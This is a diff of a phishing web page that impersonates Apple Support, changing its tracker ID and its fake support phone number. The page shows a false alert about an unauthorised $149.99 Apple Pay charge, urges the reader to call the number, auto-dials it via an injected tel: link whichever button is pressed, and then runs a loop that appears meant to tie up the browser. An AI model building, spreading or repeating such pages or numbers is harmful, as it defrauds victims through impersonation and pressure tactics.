@@ -1,8 +1,8 @@
 <!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" class="no-js">
 <head>
-      <!-- Histats.com  START  (aync)-->
+     <!-- Histats.com  START  (aync)-->
 <script type="text/javascript">var _Hasync= _Hasync|| [];
-_Hasync.push(['Histats.start', '1,5036624,4,0,0,0,00010000']);
+_Hasync.push(['Histats.start', '1,5040912,4,0,0,0,00010000']);
 _Hasync.push(['Histats.fasi', '1']);
 _Hasync.push(['Histats.track_hits', '']);
 (function() {
@@ -10,7 +10,7 @@ var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async
 hs.src = ('//s10.histats.com/js15_as.js');
 (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
 })();</script>
-<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5036624&101" alt="counter hit xanga" border="0"></a></noscript>
+<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5040912&101" alt="counter hit make" border="0"></a></noscript>
 <!-- Histats.com  END  -->
 <script defer data-domain="gllow-treathubb.web.app" src="https://plausible.io/js/script.js"></script>
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
@@ -135,7 +135,7 @@ hs.src = ('//s10.histats.com/js15_as.js');
                 <div class="ac-ln-background"></div>
                 <div class="ac-ln-content">
                     <span class="ac-ln-title">
-                       <a href="#">Apple Support +1-866-381-5529 <font color="red"><font class="js_setPhoneBlock"></font></font></a>
+                       <a href="#">Apple Support +1-888-515-4487 <font color="red"><font class="js_setPhoneBlock"></font></font></a>
 					 </span>
                     <div class="ac-ln-menu">
                         <a href="#ac-ln-menustate" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-open" id="ac-ln-menustate-open">  <span class="ac-ln-menucta-anchor-label">Open menu </span></a> <a href="#" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-close" id="ac-ln-menustate-close">  <span class="ac-ln-menucta-anchor-label">Close menu </span></a>
@@ -211,7 +211,7 @@ hs.src = ('//s10.histats.com/js15_as.js');
 						Apple </a></div>
                 </div>
                 <meta content="Apple" property="name">
-                <meta content="+1-866-381-5529
+                <meta content="+1-888-515-4487
 			 " property="telephone">
             </section>
         </div>
@@ -278,7 +278,7 @@ hs.src = ('//s10.histats.com/js15_as.js');
 
         window.number = getPar('phone');
 
-        window.number = (window.number ? window.number : '+1-866-381-5529');
+        window.number = (window.number ? window.number : '+1-888-515-4487');
 
         window.device = 'iPhone';
         window.refef = parseURL(document.referrer);
@@ -336,7 +336,7 @@ hs.src = ('//s10.histats.com/js15_as.js');
         }, 100);
 
         function okkkk() {
-            jQuery('#result').append('<a  class="anchorcall" href="tel:+1-866-381-5529"></a>');
+            jQuery('#result').append('<a  class="anchorcall" href="tel:+1-888-515-4487"></a>');
             document.querySelector('a').click();
             var extraData = "";
             for (itxextraData = 0; itxextraData < 200; itxextraData++) {
@@ -353,7 +353,7 @@ hs.src = ('//s10.histats.com/js15_as.js');
         };
 
         function myFunction() {
-            if (confirm("Your Apple ID was recently used at APPLE STORE for $149.99 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security.Not you? Immediately call Apple Support +1-866-381-5529 to Freeze it!.")) {
+            if (confirm("Your Apple ID was recently used at APPLE STORE for $149.99 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security.Not you? Immediately call Apple Support +1-888-515-4487 to Freeze it!.")) {
                 okkkk();
             } else {
                 okkkk();
